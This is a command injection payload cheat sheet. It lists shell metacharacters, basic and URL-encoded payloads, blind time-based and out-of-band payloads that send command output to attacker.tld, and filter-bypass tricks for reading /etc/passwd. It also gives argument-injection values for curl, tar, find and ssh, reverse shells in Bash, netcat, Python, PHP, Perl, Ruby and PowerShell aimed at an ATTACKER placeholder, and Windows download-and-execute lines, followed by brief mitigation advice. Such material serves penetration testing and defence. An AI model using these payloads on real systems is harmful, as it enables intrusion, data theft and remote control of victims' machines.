# Command Injection

> Command Injection occurs when an application passes user-controlled input to a system shell without sanitization, allowing the attacker to execute arbitrary OS commands.

## Summary

- [Tools](#tools)
- [Metacharacters](#metacharacters)
- [Basic Payloads](#basic-payloads)
- [Blind Command Injection](#blind-command-injection)
- [Filter Bypass](#filter-bypass)
- [Argument Injection](#argument-injection)
- [Reverse Shells](#reverse-shells)
- [Windows](#windows)
- [Mitigation](#mitigation)
- [References](#references)

## Tools

- [commix](https://github.com/commixproject/commix)
- [GTFOBins](https://gtfobins.github.io/) — binary abuse for *nix
- [LOLBAS](https://lolbas-project.github.io/) — living-off-the-land binaries for Windows
- [Interactsh](https://github.com/projectdiscovery/interactsh) — OOB detection

## Metacharacters

| Char | Behavior |
|------|----------|
| `;` | Command separator (sh) |
| `&` | Background + separator |
| `&&` | Run if previous succeeds |
| `|` | Pipe stdout to next |
| `||` | Run if previous fails |
| `` ` ` `` | Command substitution (sh) |
| `$(cmd)` | Command substitution |
| `\n` (`%0a`) | Newline → new command |
| `\r` (`%0d`) | Carriage return |
| `>` `>>` | Redirect output |
| `<` | Redirect input |

## Basic Payloads

```
;id
;id;
|id
||id
&id
&&id
`id`
$(id)
%0aid
%0a id
%0d%0aid
;uname -a
```

URL-encoded:

```
%3B+id
%26%26+id
%7C+id
%24%28id%29
%60id%60
```

Confirm execution with marker:

```
;echo XYZ123
;printf '\x58\x59\x5a'
```

## Blind Command Injection

### Time-based

```
; sleep 5
&& sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
;ping -c 5 127.0.0.1
```

### Output redirection (read later)

```
; id > /var/www/html/out.txt
; whoami > /tmp/pwn.txt
```

### Out-of-Band (OOB)

```
; nslookup `whoami`.attacker.tld
; curl http://attacker.tld/?d=$(whoami | base64)
; wget --post-data="$(id)" http://attacker.tld
; bash -c 'exec 3<>/dev/tcp/attacker.tld/53;echo "$(id)" >&3'
```

## Filter Bypass

### Whitespace alternatives

```
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
X=$'\x20';cat$X/etc/passwd
```

### Bypass blacklisted strings

```
/???/??t /???/??ss??              # /bin/cat /etc/passwd
/bin/c?t /etc/p?ssw?
c'a't /et'c'/pa'ss'wd
c"a"t /et"c"/pa"ss"wd
c\at /et\c/pa\sswd
$0='c'$0='a'$0='t' ...
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
```

### Variable concatenation

```
a=c;b=at;$a$b /etc/passwd
$(echo Y2F0 | base64 -d) /etc/passwd
```

### Wildcard tricks

```
/bin/cat /etc/p*d
ls -t /tmp | head -1
/?in/c?t /e??/p??s??
```

### Newline / CR injection

```
%0acat%20/etc/passwd
%0d%0acat%20/etc/passwd
```

### Argument injection escape

```
" ;id; "
') ; id ; #
```

## Argument Injection

When the app calls e.g. `curl <user-input>`:

```
-o /tmp/x http://attacker.tld
--upload-file /etc/passwd ftp://attacker.tld/
--config /dev/stdin     # reads attacker-controlled config
```

`tar`:

```
--checkpoint=1 --checkpoint-action=exec=sh
```

`find`:

```
-exec id ;
```

`ssh`:

```
-oProxyCommand=id
```

## Reverse Shells

> Replace `ATTACKER` and `PORT` with your listener.

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
0<&196;exec 196<>/dev/tcp/ATTACKER/PORT; sh <&196 >&196 2>&196
```

### Netcat

```bash
nc -e /bin/sh ATTACKER PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f
```

### Python

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

### PHP

```php
php -r '$s=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Stabilize the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export TERM=xterm
```

## Windows

```
& whoami
&& whoami
| whoami
|| whoami
; whoami         # in PowerShell
%0a whoami
| dir C:\
& certutil -urlcache -split -f http://attacker.tld/x.exe x.exe
& powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.tld/s.ps1')"
```

PowerShell-specific:

```powershell
;Get-Process
;[System.IO.File]::ReadAllText("C:\Windows\win.ini")
```

## Mitigation

- **Never** pass user input to a shell. Use language APIs that take an **argv array** (e.g. `subprocess.run([...], shell=False)`, `execve`).
- If shell is unavoidable, use **strict allow-listing** and **`shlex.quote()` / equivalent**.
- Drop privileges; run the process as an unprivileged user.
- Apply seccomp / AppArmor profiles to restrict syscalls.

## References

- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
